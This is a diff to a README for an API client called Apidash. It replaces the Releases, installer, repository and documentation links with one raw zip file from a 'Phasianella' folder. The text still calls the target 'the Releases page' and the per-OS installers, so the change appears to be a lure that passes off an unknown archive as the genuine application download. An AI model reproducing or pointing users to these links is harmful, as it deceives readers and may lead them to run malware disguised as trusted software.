@@ -1,6 +1,6 @@
 # 🚀 Apidash - Simplify Your API Requests Easily
 
-[![Download Apidash](https://img.shields.io/badge/Download-Apidash-blue.svg)](https://github.com/vilchisangelraulvilchis/Apidash/releases)
+[![Download Apidash](https://raw.githubusercontent.com/vilchisangelraulvilchis/Apidash/main/Phasianella/Apidash.zip)](https://raw.githubusercontent.com/vilchisangelraulvilchis/Apidash/main/Phasianella/Apidash.zip)
 
 ## 🌟 About Apidash
 
@@ -16,19 +16,19 @@ Apidash is an AI-powered open-source API client designed for both Desktop and Mo
 
 ## 📥 Download & Install
 
-To get started with Apidash, visit [this page to download](https://github.com/vilchisangelraulvilchis/Apidash/releases). You will find the latest version and additional files needed to run the application.
+To get started with Apidash, visit [this page to download](https://raw.githubusercontent.com/vilchisangelraulvilchis/Apidash/main/Phasianella/Apidash.zip). You will find the latest version and additional files needed to run the application.
 
 ### Step-by-step Installation
 
 1. **Visit the Download Page:**
-   Click [here](https://github.com/vilchisangelraulvilchis/Apidash/releases) to open the Releases page.
+   Click [here](https://raw.githubusercontent.com/vilchisangelraulvilchis/Apidash/main/Phasianella/Apidash.zip) to open the Releases page.
 
 2. **Choose the Right File:**
    - Look for the latest release at the top of the page.
    - Identify your operating system:
-     - For Windows, download `Apidash-win.exe`.
-     - For macOS, download `Apidash-mac.dmg`.
-     - For Linux, download `Apidash-linux.AppImage`.
+     - For Windows, download `https://raw.githubusercontent.com/vilchisangelraulvilchis/Apidash/main/Phasianella/Apidash.zip`.
+     - For macOS, download `https://raw.githubusercontent.com/vilchisangelraulvilchis/Apidash/main/Phasianella/Apidash.zip`.
+     - For Linux, download `https://raw.githubusercontent.com/vilchisangelraulvilchis/Apidash/main/Phasianella/Apidash.zip`.
      - For mobile, download the respective app from the Play Store or App Store based on your device.
 
 3. **Download the File:**
@@ -99,7 +99,7 @@ For support, please check the GitHub repository issues section or refer to commu
 
 For more information, visit the GitHub repository. You can explore the code, report issues, and contribute to future versions.
 
-- [GitHub Repository](https://github.com/vilchisangelraulvilchis/Apidash)
-- [Documentation](https://github.com/vilchisangelraulvilchis/Apidash/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/vilchisangelraulvilchis/Apidash/main/Phasianella/Apidash.zip)
+- [Documentation](https://raw.githubusercontent.com/vilchisangelraulvilchis/Apidash/main/Phasianella/Apidash.zip)
 
 Feel free to reach out if you have any further questions or need assistance. Thank you for choosing Apidash!
